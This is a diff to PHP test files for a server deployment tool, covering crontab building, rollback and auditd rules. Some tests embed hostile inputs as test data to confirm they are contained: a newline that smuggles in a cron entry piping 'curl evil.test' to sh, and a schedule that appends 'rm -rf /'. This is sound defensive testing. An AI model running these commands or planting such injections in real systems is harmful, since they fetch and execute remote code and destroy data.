@@ -56,31 +56,34 @@ function processes(): ProcessManager
 
 test('a crontab points at the current symlink so it follows deployments', function () {
     $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']]]);
-    $crontab = (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);
+    $crontab = app(CrontabBuilder::class)->build($app);
+    $scripts = implode("\n", app(CrontabBuilder::class)->scripts($app));
 
-    expect($crontab)->toContain('cd /var/coresmith/apps/my-app/current')
-        ->and($crontab)->toContain('php artisan schedule:run')
-        ->and($crontab)->not->toContain('/releases/');
+    expect($crontab)->toContain("-p 'WorkingDirectory=/var/coresmith/apps/my-app/current'")
+        ->and($scripts)->toContain("\nphp artisan schedule:run\n")
+        ->and($crontab . $scripts)->not->toContain('/releases/');
 });
 
 test('a crontab carries the resolved runtime path and logs to the scheduler log', function () {
     $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']]]);
-    $crontab = (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);
 
-    expect($crontab)->toContain('PATH=/opt/asdf-data/installs/php/8.5.5/bin')
-        ->and($crontab)->toContain('>> /var/coresmith/apps/my-app/shared/logs/scheduler.log 2>&1');
+    expect(app(CrontabBuilder::class)->build($app))->toContain('PATH=/opt/asdf-data/installs/php/8.5.5/bin')
+        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toEndWith("} >> '/var/coresmith/apps/my-app/shared/logs/scheduler.log' 2>&1\n");
 });
 
-test('a cron command containing a newline cannot inject extra entries', function () {
-    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => "ok\n* * * * * curl evil.test|sh"]]]);
+test('a cron command containing a newline stays in its script and cannot add cron entries', function () {
+    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => "ok\n* * * * * root curl evil.test|sh"]]]);
+    $crontab = app(CrontabBuilder::class)->build($app);
 
-    (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);
-})->throws(UnsafeNameException::class);
+    expect(substr_count($crontab, "\n"))->toBe(2)
+        ->and($crontab)->not->toContain('evil.test')
+        ->and(app(CrontabBuilder::class)->scripts($app)['/etc/coresmith/cron/my-app/0.sh'] ?? '')->toContain("\nok\n* * * * * root curl evil.test|sh\n}");
+});
 
 test('a malformed cron schedule is refused', function () {
     $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *; rm -rf /', 'command' => 'true']]]);
 
-    (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);
+    app(CrontabBuilder::class)->build($app);
 })->throws(UnsafeNameException::class);
 
 test('rolling back swaps to the previous release', function () {
@@ -212,6 +215,15 @@ test('auditd is skipped when the server has not opted in', function () {
 
     expect($transport->uploads())->not->toHaveKey('/etc/audit/rules.d/coresmith.rules');
 });
+
+test('the cron files and the scripts they run are audited alongside the crontabs', function (string $rule) {
+    expect((new SecurityHardening)->auditRules())->toContain("\n{$rule}\n");
+})->with([
+    '-w /etc/crontab -p wa -k crontab',
+    '-w /etc/cron.d/ -p wa -k crontab',
+    '-w /etc/coresmith/cron/ -p wa -k crontab',
+    '-w /var/spool/cron/ -p wa -k crontab',
+]);
 
 test('the audit rules watch every sensitive path from the spec', function (string $path) {
     expect((new SecurityHardening)->auditRules())->toContain($path);
